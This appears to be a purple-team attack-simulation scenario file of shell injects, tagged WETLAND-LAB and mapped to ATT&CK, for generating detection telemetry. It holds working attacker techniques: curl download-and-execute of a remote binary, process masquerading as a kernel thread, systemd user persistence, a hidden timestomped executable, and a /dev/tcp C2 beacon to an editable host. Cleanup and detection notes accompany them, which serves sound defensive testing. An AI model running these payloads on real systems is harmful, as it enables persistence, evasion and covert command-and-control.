scenario_information.scenario_description: Purple-team breach-and-attack-simulation of the wetland lab TTPs (github.com/s4nntysec/wetland). Each inject reproduces one `wld lab` technique as a portable, self-cleaning shell payload (no wld binary required on the agent), tagged WETLAND-LAB and mapped to ATT&CK: process masquerade (T1036), cron + systemd persistence (T1053.003 / T1543.002), hidden file + timestomp (T1564.001 / T1070.006) and an HTTP-shaped C2 beacon (T1071.001 / T1571). The techniques are intentionally loud and reversible — the goal is detectable telemetry. Target your Linux assets, run, then review prevention/detection. Edit the beacon's C2= line to your wetland relay/tunnel.

injector_contract_payload.payload_description: First step of the chain: fetch the tool-under-test. curl downloads the wld binary from the project's GitHub and runs `wld -h` (benign — prints usage) to prove download+execute, then cleanup removes it. Detection: curl writing an executable to disk and a new process spawning from it (proxy/NDR tool transfer; EDR exec-after-download).
injector_contract_payload.command_content:
# WETLAND-LAB  T1105 ingress tool transfer — pull the wld tool-under-test
url='https://raw.githubusercontent.com/s4nntysec/wetland/main/dist/release/wld-linux-x86_64'
# (swap to a Release once published: .../releases/latest/download/wld-linux-x86_64)
dst="$HOME/.wetland-lab-wld"
if curl -fsSL -o "$dst" "$url"; then
  chmod +x "$dst"
  echo "WETLAND-LAB ingress: downloaded wld -> $dst (T1105)"
  "$dst" -h 2>&1 | head -n 2
else
  echo 'WETLAND-LAB ingress: download blocked (proxy/AV) — that is a valid detection'
fi
echo 'detect: curl writing an executable to disk then executing it; proxy/NDR tool transfer'

injector_contract_payload.payload_description: Purple-team sim of `wld -l -M '[kworker/0:0]'` / `wld lab masquerade`: launches a real process whose argv[0] is faked to look like a kernel worker thread, holds it ~30s, then cleans up. Detection: a process whose comm looks like a kthread but /proc/<pid>/exe is a real file.
injector_contract_payload.payload_cleanup_command:
pkill -f '^\[kworker/0:0\]' 2>/dev/null || true
rm -f /tmp/.wetland-lab-kworker
echo 'WETLAND-LAB masquerade: cleaned'
injector_contract_payload.command_content:
# WETLAND-LAB  T1036.005 masquerade (process name)
drop=/tmp/.wetland-lab-kworker
cp "$(command -v sleep)" "$drop" && chmod +x "$drop"
( exec -a '[kworker/0:0]' "$drop" 30 ) >/dev/null 2>&1 </dev/null &
echo "WETLAND-LAB masquerade: pid $! runs $drop presenting as [kworker/0:0] for 30s"
echo "detect: comm looks like a kthread but /proc/<pid>/exe resolves to $drop"

injector_contract_payload.payload_cleanup_command:
systemctl --user disable wetland-lab.service 2>/dev/null || true
rm -f "$HOME/.config/systemd/user/wetland-lab.service"
systemctl --user daemon-reload 2>/dev/null || true
echo 'WETLAND-LAB persist[systemd]: cleaned'
injector_contract_payload.command_content:
# WETLAND-LAB  T1543.002 systemd --user persistence
d="$HOME/.config/systemd/user"; mkdir -p "$d"
cat > "$d/wetland-lab.service" <<'UNIT'
[Unit]
Description=WETLAND-LAB purple-team persistence simulation (T1543.002)
[Service]
Type=oneshot
ExecStart=/bin/sh -c 'echo WETLAND-LAB heartbeat >> %h/.wetland-lab.log'
[Install]
WantedBy=default.target
UNIT
if systemctl --user daemon-reload 2>/dev/null && systemctl --user enable wetland-lab.service 2>/dev/null; then
  echo 'WETLAND-LAB persist[systemd]: unit enabled'
else
  echo "WETLAND-LAB persist[systemd]: unit written at $d/wetland-lab.service (no user systemd session to enable)"
fi

# WETLAND-LAB  T1564.001 hidden file + T1070.006 timestomp
dst="$HOME/.wetland-lab"
cp "$(command -v ls)" "$dst" && chmod +x "$dst"
touch -r /bin/ls "$dst"
echo "WETLAND-LAB hide: dropped $dst, timestomped mtime/atime from /bin/ls"
echo "detect: find ~ -maxdepth 1 -name '.*' -type f -perm -u+x ; ctime >> mtime"

injector_contract_payload.payload_description: Mirrors `wld lab beacon --as http`: five jittered outbound check-ins shaped as HTTP GET with a fixed browser User-Agent. EDIT the C2= line to your wetland relay/tunnel host:port. Detection: beaconing regularity, fixed UA, low bytes-up/down ratio (NetFlow/Zeek).
injector_contract_payload.command_content:
# WETLAND-LAB  T1071.001 / T1571 C2 beacon (http-shaped)
C2='example.com:443'   # <-- EDIT: your wetland relay/tunnel host:port
host="${C2%%:*}"; port="${C2##*:}"; [ "$host" = "$port" ] && port=443
i=1
while [ $i -le 5 ]; do
  if exec 3<>"/dev/tcp/$host/$port" 2>/dev/null; then
    printf 'GET /%08x HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: */*\r\n\r\n' "$RANDOM" "$host" >&3
    head -c 64 <&3 >/dev/null 2>&1; exec 3>&- 2>/dev/null
    echo "WETLAND-LAB beacon #$i: check-in to $host:$port (http-shaped)"
  else
    echo "WETLAND-LAB beacon #$i: $host:$port unreachable"
  fi
  i=$((i+1)); sleep $(( (RANDOM % 7) + 3 ))
done
echo 'detect: periodic outbound to one host; fixed UA; low bytes-up/down (NetFlow/Zeek)'
